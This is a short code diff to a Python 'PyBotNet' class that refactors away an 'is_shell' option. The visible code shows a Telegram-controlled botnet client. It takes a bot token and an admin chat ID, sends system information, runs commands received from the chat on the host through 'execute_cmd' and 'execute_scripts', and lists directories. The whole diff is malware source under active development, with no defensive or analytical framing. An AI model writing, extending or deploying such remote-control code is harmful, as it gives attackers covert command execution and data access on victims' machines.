@@ -19,7 +19,6 @@ class PyBotNet:
             ADMIN_CHAT_ID,
             show_log=False,
             send_system_data=True,
-            is_shell=True,
             ignored_previous_command=True
     ):
 
@@ -27,7 +26,6 @@ class PyBotNet:
         self.ADMIN_CHAT_ID = ADMIN_CHAT_ID
         self.show_log = show_log  # show logs
         self.send_system_data = send_system_data  # send system info in message
-        self.is_shell = is_shell
 
         self.previous_update_id = [0]
         self.start_time = util.get_current_epoc_time()
@@ -83,7 +81,7 @@ class PyBotNet:
                     f'command received: \n{self.command}')
 
                 self.output = scripts.execute_scripts(
-                    self.command, self.pybotnet_up_time(), self.is_shell,
+                    self.command, self.pybotnet_up_time(),
                     self.ADMIN_CHAT_ID, self.TELEGRAM_TOKEN,
                     self.previous_update_id, self.logger)
 
@@ -107,7 +105,7 @@ class PyBotNet:
 
     def run_command_in_system(self, command: str) -> str:
         '''run system command in console and return data'''
-        return scripts.execute_cmd(command, self.is_shell, self.logger)
+        return scripts.execute_cmd(command,self.logger)
 
     def run_ls(self, path: str) -> str:
         '''return list of directory or files'''
